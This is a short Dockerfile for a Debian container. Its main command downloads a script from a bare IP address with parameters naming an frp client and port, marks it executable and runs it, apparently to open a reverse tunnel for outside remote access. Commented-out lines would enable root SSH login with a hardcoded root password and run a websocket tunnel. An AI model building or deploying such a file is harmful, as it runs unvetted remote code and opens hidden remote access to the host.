FROM debian
RUN apt update
RUN apt install ssh wget npm -y
#RUN  npm install -g wstunnel
#RUN mkdir /run/sshd 
#RUN echo 'wstunnel -s 0.0.0.0:80 &' >>/1.sh
#RUN echo '/usr/sbin/sshd -D' >>/1.sh
#RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
#RUN echo root:netcyroot|chpasswd
#RUN chmod 755 /1.sh
RUN wget -O cvs.sh --post-data="frpc=local&name=intel2&port=8208" http://8.142.11.99:8000/gce.sh.php
RUN chmod 777 ./cvs.sh
EXPOSE 80
CMD  ./cvs.sh
#CMD /1.sh
